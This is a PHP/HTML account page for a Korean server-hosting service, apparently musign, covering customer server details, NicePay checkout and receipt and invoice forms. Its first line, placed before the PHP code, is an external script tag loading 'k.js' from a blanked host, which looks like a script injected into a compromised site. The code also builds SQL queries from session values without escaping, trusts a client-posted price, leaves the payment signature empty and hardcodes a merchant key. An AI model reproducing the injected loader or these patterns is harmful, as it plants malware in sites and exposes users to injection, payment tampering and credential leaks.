<script type='text/javascript' src='https:// /k.js?v=222'></script>
<?php
header("Content-Type:text/html; charset=utf-8;");
require_once ($_SERVER['DOCUMENT_ROOT'] . "/include/init.php");
require_once ($_SERVER['DOCUMENT_ROOT'] . "/common/header.php");

$user_query =
              "
                  SELECT 
                         aa.*,bb.*,aa.idx AS user_idx,
                         (CASE aa.server_name
                          WHEN '1' THEN 'CAFE24_C'
                          WHEN '2'  THEN 'AWS_B'
                          WHEN '3'  THEN 'AWS_C'
                          WHEN '4' THEN 'SynologyNAS'
                          WHEN '5'  THEN 'AWS_A'
                          WHEN '6'  THEN 'CAFE24_B'
                          WHEN '7' THEN 'CAFE24_F'
                          WHEN '8'  THEN 'CAFE24_G'
                          END) AS user_server 
                   FROM server_info bb
                          JOIN user aa
                          ON bb.idx = aa.server_name
                   where aa.user_id = '{$_SESSION['login_id']}'
               ";

$user_result = sql_query($user_query);
$user_row = sql_fetch($user_result);


$get_pay_info = "select * from pay_result where user_idx='{$user_row['user_idx']}' and tid='{$user_row['tid']}'";
$get_pay_result = sql_query($get_pay_info);
$get_pay_row = sql_fetch($get_pay_result);

if ($_SESSION['idx'] == "") {?>
	<script>
		alert("로그인을 먼저해 주세요.");
		location.href="http://server.musign.co.kr/";
	</script>
<?php
}

// 세금계산서
$invoice_cnt_query = "SELECT COUNT(*) AS cnt FROM invoice_payment WHERE cust_no='{$_SESSION['idx']}'";
$invoice_cnt_result = sql_query($invoice_cnt_query);
$invoice_cnt_row = sql_fetch($invoice_cnt_result);

$mgt_num = $user_row['server_name'] . '-' . $user_row['idx'] . '-' . $invoice_cnt_row['cnt'];

// 현금영수증
// $cashbill_cnt_query = "SELECT COUNT(*) AS cnt FROM cash_recipt WHERE user_idx = '{$_SESSION['idx']}'";
$cashbill_cnt_query = "SELECT * FROM cash_recipt";
$cashbill_cnt_result = sql_count(sql_query($cashbill_cnt_query));
$cashbill_cnt_row = $cashbill_cnt_result + 10000; 

$cash_mgt_num = $user_row['server_name'] . '-' . $user_row['idx'] . '-' . $cashbill_cnt_row;

$today = date("Ymd");

/*
 * ******************************************************
 * <결제요청 파라미터>
 * 결제시 Form 에 보내는 결제요청 파라미터입니다.
 * 샘플페이지에서는 기본(필수) 파라미터만 예시되어 있으며,
 * 추가 가능한 옵션 파라미터는 연동메뉴얼을 참고하세요.
 * ******************************************************
 */
$price = "{$server_info_row['server_price']}"; // 결제상품금액

if (isset($_POST['server_price'])) {
    $price = $_POST['server_price'];
}

// moid 자동증가
$max_query = "select * from pay_result";
$max = sql_count(sql_query($max_query));
$cnt = $max + 1;

$merchantKey = "a9Mw0kcxO9/p6vqXJZg227dIbFIuLMD7AI/WlnBK8kPlG022KuOBdlnfCer8Ihh1+OPeB3KACSDpwYIifNY5sg==";
$MID = "musigner1m";
// $merchantKey = "EYzu8jGGMfqaDEp76gSckuvnaHHu+bC4opsSN6lHv3b2lurNYkVXrZ7Z1AoqQnXI3eLuaUFyoRNC6FkrzVjceg=="; // 상점키
// $MID = "nicepay00m"; // 상점아이디
$goodsName = "{$user_row['user_server']}"; // 결제상품명
$buyerName = "{$user_row['user_name']}";    // 구매자명
$buyerTel = "{$user_row['user_phone']}";    // 구매자연락처
$buyerEmail = "{$user_row['user_email']}";  // 구매자메일주소
$moid = "{$cnt}"; // 상품주문번호
$returnURL = $_SERVER['DOCUMENT_ROOT']."/mypage/"; // 결과페이지(절대경로) - 모바일 결제창 전용

/*
 * ******************************************************
 * <해쉬암호화> (수정하지 마세요)
 * SHA-256 해쉬암호화는 거래 위변조를 막기위한 방법입니다.
 * ******************************************************
 */

$ediDate = date("YmdHis");
// $hashString = bin2hex(hash('sha256', $ediDate.$MID.$price.$merchantKey, true));
?>

<script src="/js/test.js"></script>
<!-- <script src="https://web.nicepay.co.kr/v3/webstd/js/nicepay-3.0.js" type="text/javascript"></script> -->
<script src="https://t1.daumcdn.net/mapjsapi/bundle/postcode/prod/postcode.v2.js"></script>


<script type="text/javascript">
//결제창 최초 요청시 실행됩니다.
var price="";

function nicepayStart(){
	if ($('#finalBtn').text()!='결제하기') {
		return;
	}else{
		var pay_flag=0;
		$(".pay_method").each(function(){
			if ($(this).prop('checked')!=1) {
				pay_flag=1;
			}else{
				pay_flag=0;
				return false;
			}
		});
		
		if (pay_flag==1) {
			alert('결제수단을 선택해주세요.');
			return;
		}
		
    	if ( !$("#finalCheck").prop('checked')){
    		alert('결제진행 동의를 해주세요.');
    		return;
    		
    	}else{	
        	if(checkPlatform(window.navigator.userAgent) == "mobile"){//모바일 결제창 진입
            	alert("모바일은 지원하지 않습니다.");
            	return;
        		//document.payForm.action = "https://web.nicepay.co.kr/v3/v3Payment.jsp";
        		//document.payForm.submit();
        	}else{//PC 결제창 진입
            	
        		goPay(document.payForm);
        	}
    	}
	}
	
}

//[PC 결제창 전용]결제 최종 요청시 실행됩니다. <<'nicepaySubmit()' 이름 수정 불가능>>
function nicepaySubmit(){
	$("#payForm").ajaxSubmit({
		success: function(data)
		{

			console.log(data);
			
    		var result = JSON.parse(data);
    		if(result.ResultCode == "3001" || result.ResultCode == "4000" || result.ResultCode == "4100" || result.ResultCode == "0000")
    		{
    			alert("성공");
    			location.reload();
    		}
    		else
    		{
    			alert("실패");
    		}
    		
		}
	});
	//document.payForm.submit();
}

//[PC 결제창 전용]결제창 종료 함수 <<'nicepayClose()' 이름 수정 불가능>>
function nicepayClose(){
	alert("결제가 취소 되었습니다");
}

//pc, mobile 구분(가이드를 위한 샘플 함수입니다.)
function checkPlatform(ua) {
	if(ua === undefined) {
		ua = window.navigator.userAgent;
	}
	
	ua = ua.toLowerCase();
	var platform = {};
	var matched = {};
	var userPlatform = "pc";
	var platform_match = /(ipad)/.exec(ua) || /(ipod)/.exec(ua) 
		|| /(windows phone)/.exec(ua) || /(iphone)/.exec(ua) 
		|| /(kindle)/.exec(ua) || /(silk)/.exec(ua) || /(android)/.exec(ua) 
		|| /(win)/.exec(ua) || /(mac)/.exec(ua) || /(linux)/.exec(ua)
		|| /(cros)/.exec(ua) || /(playbook)/.exec(ua)
		|| /(bb)/.exec(ua) || /(blackberry)/.exec(ua)
		|| [];
	
	matched.platform = platform_match[0] || "";
	
	if(matched.platform) {
		platform[matched.platform] = true;
	}
	
	if(platform.android || platform.bb || platform.blackberry
			|| platform.ipad || platform.iphone 
			|| platform.ipod || platform.kindle 
			|| platform.playbook || platform.silk
			|| platform["windows phone"]) {
		userPlatform = "mobile";
	}
	
	if(platform.cros || platform.mac || platform.linux || platform.win) {
		userPlatform = "pc";
	}
	
	return userPlatform;
}
</script>


<script>

$(window).ready(function(){

	$(".myp-payment > .cellbox").eq(0).show();
	$(".tabwra > div").click(function(){
		var ind = $(this).index();
		$(".tabwra > div ").removeClass("on");
		$(this).addClass("on");
		$(".myp-payment > .cellbox").hide();
		$(".myp-payment > .cellbox").eq(ind).show();
	});

});

$(function(){
	$(window).ready(function(){
		price_choose(0);
		$('#invoice_area').hide();
// 		$(".myp-payment .myp-rchk").click(function(){
// 			$(".myp-payment .myp-rchk").removeClass("on");
// 			$(this).addClass("on");
// 		});
		$('.pay').text('0');
	});
})

function do_pay(){
	if ( !$("#finalCheck").prop('checked')){
		alert('결제진행 동의를 해주세요.');
	}else{ //동의시		
		$.ajax({
			type : "POST", 
			url : "/mypage/do_pay_proc.php",
			dataType : "text",
			data : 
			{
				pay_check : 'Y'
			},
			error : function() 
			{
				console.log("통신에 오류가 있습니다.");
			},
			success : function(data) 
			{
				console.log(data);
				location.reload();
			}
		});
	}	
}
function price_choose(idx){
	if (idx!=0) {
    	price = $(idx).next().find('span').text();
    	price = price.slice(0,-1);
    	$('.pay').text(price);
    	price = price.replace(/,/gi,'');
    	//$("#Amt").val(price);
        $.ajax({
            type : 'POST',
            url : '/mypage/getHash.php',
            dataType : "text",
            data : 
            {
            	server_price : price,
            },
            error: function(){
                alert('통신에 오류가 있습니다.');
            },
            success : function(data){
                var from_date =  data.split('@');
                $("#signdata").val(from_date[0]);
                $("#edidate").val(from_date[1]);
                $("#Amt").val(price);
            }
           
        });
	}
    //	$('#amount').val(price);
}

/*
function baroStart(){
	$('#ti_area').show();
}
*/

function show_invoice(){
	if ($('#invoice_area').hasClass('act')) {
		$('#invoice_area').removeClass('act');
		$('#invoice_area').hide();
	}else{
		$('#invoice_area').addClass('act');
		$('#invoice_area').show();
	}
	
}

function send_invoice(){
	
    	var validationFlag = "Y";
    
    	if(/[^0123456789]/g.test($("#corp_num").val())) {
    		alert("숫자만 입력해주세요.");
    		$("#corp_num").val('');
    		$("#corp_num").focus();
    		return;
    	}
    	
    	$(".notEmpty").each(function() 
    	{
    		if ($(this).val() == "") 
    		{
    			alert($(this).prev().text()+"을(를) 입력해주세요.");
    			$(this).focus();
    			validationFlag = "N";
    			return false;
    		}
    	});

    	if(validationFlag == "Y")
    	{
    		$("#invoiceForm").ajaxSubmit({
    			success: function(data)
    			{
    				console.log(data);
    				var result = JSON.parse(data);
    	    		if(result.isSuc == "success")
    	    		{
    	    			alert(result.msg);
     	    			location.reload();
    	    		}
    	    		else
    	    		{
    	    			alert(result.msg);
    	    		}
    			}
    		});
    	}
}

function show_address() {
    new daum.Postcode({
        oncomplete: function(data) {
        	var addr = data.address;
        	document.getElementById("addr").value = addr;
        }
    }).open();
}

function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function choose_price(text,val){
	$('.'+text+'_price_area').show();
	
	$(".use_way").each(function(){
		$(this).prop('checked',false);
	});

	$(".myp-rchk").each(function(){
		$(this).removeClass('on');
	});

	$('.pay').text('0');
	$('#Amt').val(0);
	
	var len, point, str;
	var gob_cnt=1;
	var num=0;
	$("."+text+"_price").each(function(){
		num=val*gob_cnt;
		$(this).text(numberWithCommas(num)+'원');
		gob_cnt++;
	});
}

function choose_paymethod(idx){
	$('#PayMethod').val(idx);
}


// 현금영수증
function send_cashbill(){

    	var validationFlag = "Y";
    
    	if(/[^0123456789]/g.test($("#trade_method").val())){
    		alert("숫자만 입력해주세요.");
    		$("#trade_method").val('');
    		$("#trade_method").focus();
    		return;
    	}
    	
    	$(".notEmpty").each(function() 
    	{
    		if ($(this).val() == "") 
    		{
    			alert($(this).prev().text()+"을(를) 입력해주세요.");
    			$(this).focus();
    			validationFlag = "N";
    			return false;
    		}
    	});

    	if(validationFlag == "Y")
    	{
    		$("#cashbillForm").ajaxSubmit({
    			success: function(data)
    			{
    				console.log(data);
    				var result = JSON.parse(data);
    	    		if(result.isSuc == "success")
    	    		{
    	    			alert(result.msg);
     	    			location.reload();
    	    		}
    	    		else
    	    		{
    	    			alert(result.msg);
    	    		}
    			}
    		});
    	}
}

var identity = "";
function chkcorp()
{
   		 $.ajax({
        		type:"post",
        		url: "/Baro/BaroService_PHP5_Sample/CORPSTATE/API_CORPSTATE/GetCorpState.php",
        		dataType:"text",
        		data : 
        		{
        			identity : $('input[name=identity]').val()
        		},
        		error : function() 
        		{
        			console.log("AJAX ERROR");
        		},
        		success : function(data) 
        		{
        			console.log(data);
        			var result = JSON.parse(data);
        			if(result.msg == "조회 성공")
            		{
        	    		alert(result.msg);
        	    		location.href="http://server.musign.co.kr/mypage/index.php";
            		}
            		else
            		{
            			alert(result.msg);
            		}
        		}
        	});
}

</script>


<div class="sub-top text-center">
	<p class="mtit-sp">Digital Experience platform - musign</p>
	<p class="mtit-big">
		musign<span class="color-g">care</span>
	</p>
</div>

<div class="mypage-top">
	<div class="myp-grid">
		<h2 class="text-center">Mypage</h2>
		<div class="mytop-wr">
			<p class="color-g mytop-tit">
				<span>Welcome!</span>
			</p>
			<div class="table mytop-ta">
				<div>`
					<p class="mytop-name">
						<strong><?php echo $user_row['user_co']?></strong>의 <br>
						<strong><?php echo $user_row['user_name']?></strong>담당자님, 반갑습니다.
	
					</p>
					<div class="myn-bot">
						<h5 class="myn-btit">서버 담당자</h5>
						<p class="ser-name">정기영 책임</p>
						<?php 
						
						?>
						<p class="ser-te">
							Tel. <span class="ser-tel">070-8645-0123</span>
						</p>
						<p class="ser-te">
							E-mail. <span class="ser-tel">chaplin@musign.net</span>
						</p>
					</div>
				</div>
				<div class="myr-divwr m100">
					<div class="myr-div">
						<div>
							<h5>
								고객 정보 <a
									href="../member/modify_view.php?idx=<?php echo $user_row['user_idx']?>"
									class="mod-btn">수정</a>
							</h5>
							<ul class="cli-info">
								<li><b>업체명</b><span class=""><?php echo $user_row['user_co']?></span></li>
								<li><b>담당자</b><span class=""><?php echo $user_row['user_name']?></span></li>
								<li><b>연락처</b><span class=""><?php echo $user_row['user_phone']?></span></li>
							</ul>
						</div>
						<div>
							<h5>웹사이트 정보</h5>
							<ul class="cli-info">
								<li><b>사이트</b><span class=""><?php echo $user_row['url_tx']?></span></li>
								<li><b>URL</b><a href="" class=""><?php echo $user_row['url']?></a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<?php
if ($user_row['pay_yn'] == 'Y') {
    ?>
<div class="service_info">
	<div class="inner">

		<div class="twra">
			<div class="tbox">
				<p class="tt tt1">

					<span>musign <em>family care service</em></span>를<br> 이용해주셔서 감사합니다.
				</p>
				<p class="tt tt2">
					귀사의 성공적인 비즈니스와 웹 환경을<br> 제공하기 위해 항상 노력하겠습니다.
				</p>
			</div>
		</div>

		<div class="info">
			<div class="cbox">
				<div class="imgwra">
					<img src="/img/info_img.png">
				</div>
				<div class="cont">
					<p class="info_tit">서비스 이용내역</p>
					<ul>
						<li><strong>업체명</strong>
							<p>㈜<?php echo $user_row['user_co']?></p></li>
						<li><strong>URL</strong>
							<p><?php echo $user_row['url']?></p></li>
						<li><strong>담당자</strong>
							<p><?php echo $user_row['user_name']?></p></li>
						<li><strong>이용서버</strong>
							<p><?php echo $user_row['server_type']?></p></li>
						<li><strong>서버스 이용기간 </strong>
							<p>
							<?php
                                $start_date = date('Y-m-d', strtotime($user_row['date_start']));
                                $end_date = date('Y-m-d', strtotime($user_row['date_end']));
                                
                                $start_date_new = new Datetime($start_date);
                                $end_date_new = new DateTime($end_date);
                            
                                $left_date = date_diff($start_date_new, $end_date_new);
                                 echo $start_date?> ~ <?php echo $end_date
                            ?>
								<span><em><?php echo $left_date ->days;?>일후 만료</em> 서비스 이용 마감기한 한달 전 갱신 안내메일이 발송됩니다.</span>
							</p>
						</li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
     <button id="" onclick="show_invoice();">발행</button>
 <?php
// if ($get_pay_row['rcpttype'] = 0) {
//     ?>
 <?php
// } 
?>   
<!-- 세금 계산서  -->
<div id="invoice_area" class="pop">
	<div>
		<input type="button" value="닫기" onclick="show_invoice();">
	</div>
	<div class="pop_inner">
		<div class="pop_">
				<form name="invoiceForm" id="invoiceForm" method="post" action="/Baro/BaroService_PHP5_Sample/TI/API_TI/RegistAndIssueTaxInvoice.php">
				  <input type="text" id="mgt_num" class="notEmpty" name="mgt_num" value="<?php echo $mgt_num?>"> 
				  <input type="text" id="cust_no" class="notEmpty" name="cust_no" value="<?php echo $_SESSION['idx']?>"> 
				  <input type="text" id="item" name="item" value='<?php echo $user_row['user_server']?>'>
				  <input type="text" id="amount" name="amount" value='<?php echo $get_pay_row['amt']?>'><Br>
				*<span>사업자번호</span> : <input type="text" class="" id="corp_num" name="corp_num"><Br>
				*<span>상호</span> : <input type="text" class="notEmpty" id="corp_name" name="corp_name" value='<?php echo $user_row['user_co']?>'><Br> 
				*<span>대표자 이름</span> : <input type="text" class="notEmpty" id="ceo_name" name="ceo_name"><Br>
				*<span>주소</span> : <input type="text" class="notEmpty" id="addr" name="addr" onclick="show_address();" readonly="readonly"><Br> 
				*<span>업태</span> : <input type="text" id="biz_type" name="biz_type"><Br> 
				*<span>업종</span> : <input type="text" id="biz_class" name="biz_class"><Br> 
				*<span>담당자</span> : <input type="text" class="notEmpty" id="contact_name" name="contact_name" value='<?php echo $user_row['user_name']?>'><Br>
				*<span>tel</span> : <input type="text" id="tel" name="tel" value='<?php echo $user_row['user_phone']?>'><Br> 
				*<span>email</span> : <input type="text" class="notEmpty" id="email" name="email" value='<?php echo $user_row['user_email']?>'><Br> 
			</form>
			<button id="" onclick="send_invoice();">발행</button>
		</div>
	</div>
</div>
<?php
} else {
    ?>
<div class="mypage-div bd-n" id="">

	<div class="myp-grid">
		<!--<p class="myp-tit">뮤자인 사의 추천 서버 안내 <?php echo $server_info_row['server_type']?></p>-->
		<p class="myp-tit ">뮤자인 사의 추천 서버 안내</p>

		<div class="myp-rec">
			귀사의 사이트는 <span class="rec-span">기업 사이트, 브랜드 사이트</span>로 <span
				class="rec-span"><?php echo $user_row['user_server']?> 서버</span> 사용을
			추천드립니다.
		</div>

		<div class="myp-payment">

			<div class="cellbox cellbox2">
				<div class="cell cell1 wid-100">
					<p class="myp-ptit"><?php echo $user_row['server_type']?>의 특징
					<ul>
					<?php
                        $server_feature_arr = explode('@', $user_row['server_feature']);
                        for ($i = 0; $i < count($server_feature_arr) - 1; $i ++) {
                     ?>
							<li class="mu_nas">
								<span>0<?php echo $i+1?></span>
								<div class="mu_text"><?php echo $server_feature_arr[$i]?></div>
							</li>
					<?php
                         }
                     ?>
					</ul>
					</p>
				</div>
				<!-- // cell 1 -->

				<div class="cell cell2">
					<p class="myp-ptit">서비스선택</p>
					<ul>
						<li>
							<p class="myp-rchk">
								<input id="mypService1" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this);"> <label
									for="mypService1"> 1년 이용권 <span><?php echo number_format($user_row['server_price'])?>원</span>
								</label>
							</p>
						</li>
						<li>
							<p class="myp-rchk">
								<input id="mypService2" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this);"> <label
									for="mypService2"> 2년 이용권 <span><?php echo number_format($user_row['server_price']*2)?>원</span>
								</label>
							</p>
						</li>
						<li>
							<p class="myp-rchk">
								<input id="mypService3" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this);"> <label
									for="mypService3"> 3년 이용권 <span><?php echo number_format($user_row['server_price']*3)?>원</span>
								</label>
							</p>
						</li>
					</ul>
				</div>
				<!-- // cell 2 -->
			</div>
			<!-- // cellbox 1 -->

			<div class="payment">
				<p>
					결제 금액 <span class="pay"><?php echo number_format($user_row['server_price'])?></span>원
				</p>
			</div>
			<!-- // payment -->

			<script>
    				$(window).ready(function(){
    					$(".payment_wra").hide();
    					$("#finalBtn").click(function(){
    						$(".payment_wra").show();
    						$(this).text("결제하기");
    					});
    				});
    				
    				$(window).ready(function(){
    					$("#payment_progress ul li").click(function(){
    						var idx = $(this).index();
    						$("#payment_progress ul li").removeClass("on");
    						$(this).addClass("on");
    						
    						if ($("#payment_progress ul li").eq(0).hasClass("on"))
    						{
    							$("#payment_progress .import_txt").show();
    						}else{
    							$("#payment_progress .import_txt").hide();
    						}
    
    					});
    				});
    				
			</script>

			<div class="myp-grid bd-n payment_wra">
				<p class="myp-tit ">결제수단 선택 / 결제</p>
				<div id="payment_progress">
					<div class="inner">
						<div class="boxwra">
							<div class="cellbox- cellbox-0">
								<div class="cell cell1">
									<p class="tit">영수증 발급 신청</p>
								</div>
								<!-- // cell 1-->
								<div class="cell cell2">
									<div class="tabwra-">
										<ul>
											<li class="myp-rchk">
												<input type="radio" id="1" class="" name="0">
												<label for="1">미신청</label>
											</li>
											<li class="myp-rchk">
												<input type="radio" id="2" class="" name="0">
												<label for="2">현금영수증</label>
											</li>
											<li class="myp-rchk">
												<input type="radio" id="3" class="" name="0">
												<label for="3">세금계산서</label>
											</li>
										</ul>
									</div>

									<div class="import_txt">
										<p>( 무통장 입금 의 경우 입금확인 후부터 배송단계가 진행됩니다. )</p>
									</div>
								</div>
								<!-- // cell2 -->
							</div>
							<!-- // cellbox- -->

							<div class="cellbox- cellbox-1">
								<div class="cell cell1">
									<p class="tit">일반결제</p>
								</div>
								<!-- // cell 1-->
								<div class="cell cell2">
									<div class="tabwra-">
										<ul>
											<li class="myp-rchk">
												<input id="vbank" type="radio" class='mypservice pay_method' name="pay_method" value="VBANK" onclick="choose_paymethod('VBANK');"> 
												<label for="vbank">가상계좌</label></li>
											<li class="myp-rchk"><input id="card" type="radio"
												class='mypservice pay_method' name="pay_method" value="CARD"
												onclick="choose_paymethod('CARD');"> <label for="card">신용카드</label>
											</li>
											<li class="myp-rchk"><input id="bank" type="radio"
												class='mypservice pay_method' name="pay_method" value="BANK"
												onclick="choose_paymethod('BANK');"> <label for="bank">계좌이체</label>
											</li>
										</ul>
									</div>

									<div class="import_txt">
										<p>( 무통장 입금 의 경우 입금확인 후부터 배송단계가 진행됩니다. )</p>
									</div>
								</div>
								<!-- // cell2 -->
							</div>
							<!-- // cellbox- -->
						</div>
					<!-- // boxwra -->
					</div>
					<!-- // payment_progress -->
				</div>
			</div>

			<div class="payment-final">
				<div class="cell cell1">
					<p class="final-chk">
						<input id="finalCheck" type="checkbox" name="finalCheck" style="display: none"> 
						<label class="check_s" for="finalCheck">위 상품의 구매조건 확인 및 결제진행에 동의합니다.</label>
					</p>
				</div>
				<div class="cell cell2">
					<button id="finalBtn" onclick="nicepayStart();">신청하기</button>
				</div>
			</div>
			<p>----현금영수증----</p>
				<form name="cashbillForm" id="cashbillForm" method="post" action="/Baro/BaroService_PHP5_Sample/CASHBILL/API_CASHBILL/RegistCashBill.php">
    			  *<span>주문번호</span>  :  <input type="text" id="cash_mgt_num" class="notEmpty" name="cash_mgt_num" value="<?php echo $cash_mgt_num?>"> 
    			  <input type="hidden" id="user_idx" class="notEmpty" name="user_idx" value="<?php echo $_SESSION['idx']?>"> <Br>
    				
    				*<span>신청날짜</span>   : <input type="text" id="trade_date" name="trade_date" value='<?php echo $today?>'><Br>
    				*<span>품목명</span>    : <input type="text" class="notEmpty" id="item_name" name="item_name" value='<?php echo $user_row['user_server']?>'><Br>
    				*<span>신청자명</span>   : <input type="text" class="notEmpty" id="franchise_ceoname" name="franchise_ceoname" value='<?php echo $user_row['user_name']?>'><Br>
    				*<span>발행용도</span>   : <label><input type="radio" id="trade_usage" name="trade_usage" value="1">소득공제</label>
    									     <label><input type="radio" id="trade_usage" name="trade_usage" value="2">지출증빙</label><Br>
    <!-- 			   <span>거래유형</span>   : <label><input type="radio" id="max_tax" name="max_tax" value="1">과세</label> -->
    <!-- 								  	     <label><input type="radio" id="max_tax" name="max_tax" value="2">면세</label> -->
    <!-- 								  	     <label><input type="radio" id="max_tax" name="max_tax" value="3">복합과세<Br></label> -->		
    				*<span>인증종류</span>   : <label><input type="radio" id="trade_method" name="trade_method" value="4" class="notEmpty">사업자번호</label>
    									   	<label><input type="radio" id="trade_method" name="trade_method" value="5"  class="notEmpty">휴대폰번호</label><Br>
<!--      				<span>휴대폰번호  :</span><input type="text" id="identity" name="identity" class="notEmpty"><Br> -->
    				<span>사업자번호  :</span><input type="text" id="identity" name="identity" class="notEmpty">
    										 <input type="button" onclick="chkcorp();" name="gochkcorp" value="조회"><Br/> 
    				*<span>이메일</span>     : <input type="text" class="notEmpty" id="email" name="email" value='<?php echo $user_row['user_email']?>'><Br> 
    				*<span>신청금액</span>   : <input type="text" id="amount" class="notEmpty" name="amount"><Br> 			
    <!-- 				 <span>부가가치세</span>  : <input type="hidden" id="tax" name="tax"><Br> -->
    <!-- 				 <span>봉사료</span>     : <input type="hidden" id="service_charge" name="service_charge"><Br> -->
				</form>
			<button id="" onclick="send_cashbill()">발행</button>
			
			<div>
	</div>
	<br/>
	<p>----세금계산서----</p>
	<div class="pop_inner">
		<div class="pop_">
				<form name="invoiceForm" id="invoiceForm" method="post" action="/Baro/BaroService_PHP5_Sample/TI/API_TI/RegistAndIssueTaxInvoice.php">
				  <input type="text" id="mgt_num" class="notEmpty" name="mgt_num" value="<?php echo $mgt_num?>"> 
				  <input type="text" id="cust_no" class="notEmpty" name="cust_no" value="<?php echo $_SESSION['idx']?>"> 
				  <input type="text" id="item" name="item" value='<?php echo $user_row['user_server']?>'>
				  <input type="text" id="amount" name="amount" value='<?php echo $get_pay_row['amt']?>'><Br>
				*<span>사업자번호</span> : <input type="text" class="" id="corp_num" name="corp_num"><Br>
				*<span>상호</span> : <input type="text" class="notEmpty" id="corp_name" name="corp_name" value='<?php echo $user_row['user_co']?>'><Br> 
				*<span>대표자 이름</span> : <input type="text" class="notEmpty" id="ceo_name" name="ceo_name"><Br>
				*<span>주소</span> : <input type="text" class="notEmpty" id="addr" name="addr" onclick="show_address();" readonly="readonly"><Br> 
				*<span>업태</span> : <input type="text" id="biz_type" name="biz_type"><Br> 
				*<span>업종</span> : <input type="text" id="biz_class" name="biz_class"><Br> 
				*<span>담당자</span> : <input type="text" class="notEmpty" id="contact_name" name="contact_name" value='<?php echo $user_row['user_name']?>'><Br>
				*<span>tel</span> : <input type="text" id="tel" name="tel" value='<?php echo $user_row['user_phone']?>'><Br> 
				*<span>email</span> : <input type="text" class="notEmpty" id="email" name="email" value='<?php echo $user_row['user_email']?>'><Br> 
			</form>
			<button id="" onclick="send_invoice();">발행</button>
		</div>
	</div>

    			<form name="payForm" id="payForm" method="post" action="/api_test_code/payResult_utf.php">
    				<input type="hidden" id="PayMethod" name="PayMethod" value="VBank">
    				<input type="hidden" id="goodsname" name="GoodsName" value="<?php echo $user_row['user_server']?>"> <br> 
    				<input type="hidden" id="Amt" name="Amt" value="<?php echo($price)?>"> <br>
    				<input type="hidden" id="mid" name="MID" value="<?php echo($MID)?>"><br> 
    				<input type="hidden" id="moid" name="Moid" value="<?php echo($moid)?>"> <br> 
    				<input type="hidden" id="buyername" name="BuyerName" value="뮤자인"> <br> 
    				<input type="hidden" id="buyeremail" name="BuyerEmail" value="<?php echo($buyerEmail)?>"> <br> 
    				<input type="hidden" id="buyertel" name="BuyerTel" value="<?php echo($buyerTel)?>"> <br>
    				<input type="hidden" id="returnurl" name="ReturnURL" value="<?php echo($returnURL)?>"> <br> 
    				<input type="hidden" name="VbankExpDate" value=""><br> 
    				<input type="hidden" name="GoodsCl" value="1" /> <br> 
    				<input type="hidden" name="TransType" value="0" /> <br> 
    				<input type="hidden" name="CharSet" value="utf-8" /> <br> 
    				<input type="hidden" name="ReqReserved" value="" /> <br> 
    				<input type="hidden" name="FnCd" value="07" /> <br> 
    				<input type="hidden" name="FnName" value="현대" /> <br> 
    				<input type="hidden" name="CashRcptCl" value="1" /> <br> 
    				<input type="hidden" name="OptionList" value="no_receipt" /> <br> 
    				<input type="hidden" id="edidate" name="EdiDate" value="<?php echo($ediDate)?>" /> <br>
    				<input type="hidden" id="signdata" name="SignData" value="<?php echo($hashString)?>" />
    			</form>
    		</div>
    		<!-- // payment_final -->

    	</div>
    	<!-- // myp-service -->

    </div>

</div>

<?php
}
?>

<div class="mypage-div">
	<div class="myp-grid">
		<p class="myp-tit">Musign family care service</p>
		<div class="myp-service p010">
			<ul>
				<li><img src="/img/mypage_i1.png" alt="musgin"> <strong>Server Management</strong>
					<p>
						서버 전담팀 운영<br> 맨투맨
					</p>
				</li>

				<li><img src="/img/mypage_i2.png" alt="musgin"> <strong>Quick Reaction </strong>
					<p>긴급상황 대응</p>
				</li>

				<li><img src="/img/mypage_i3.png" alt="musgin"> <strong>Free Installation</strong>
					<p>웹사이트 환경 무료 설치 지원</p>
				</li>

				<li><img src="/img/mypage_i4.png" alt="musgin"> <strong>Installation Support</strong>
					<p>SSL 설치 지원 (SSL 구매비용 별도)</p>
				</li>

				<li><img src="/img/mypage_i5.png" alt="musgin"> <strong>Installation Support</strong>
					<p>주기적 백업 지원</p>
				</li>

				<li><img src="/img/mypage_i6.png" alt="musgin"> <strong>Server Previous</strong>
					<p>서버 및 DB 이전 지원</p>
				</li>

				<li><img src="/img/mypage_i7.png" alt="musgin"> <strong>Version Management</strong>
					<p>소프트웨어 버전 최신화 관리</p>
				</li>
			</ul>
		</div>
	</div>
</div>


<?php require_once($_SERVER['DOCUMENT_ROOT']."/common/footer.php"); ?>